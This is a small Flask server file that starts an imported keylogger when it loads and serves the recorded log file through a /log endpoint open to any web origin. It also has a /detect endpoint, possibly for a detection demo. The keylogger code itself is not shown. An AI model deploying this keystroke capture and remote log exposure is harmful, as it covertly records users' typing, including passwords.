from flask import Flask, jsonify
from detector import detect
import os
from keylogger import start_keylogger
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

start_keylogger()

@app.route('/log', methods=['GET'])
def get_log():
    log_path = os.path.join(os.path.dirname(__file__), 'logs.txt')
    if not os.path.exists(log_path):
        return jsonify({'error': 'logs.txt not found'}), 404
    with open(log_path, 'r') as f:
        content = f.read()
    return jsonify({'log': content})

@app.route('/detect', methods=['GET'])
def detect_endpoint():
    result = detect()
    return jsonify(result)

if __name__ == '__main__':
    app.run(debug=True) 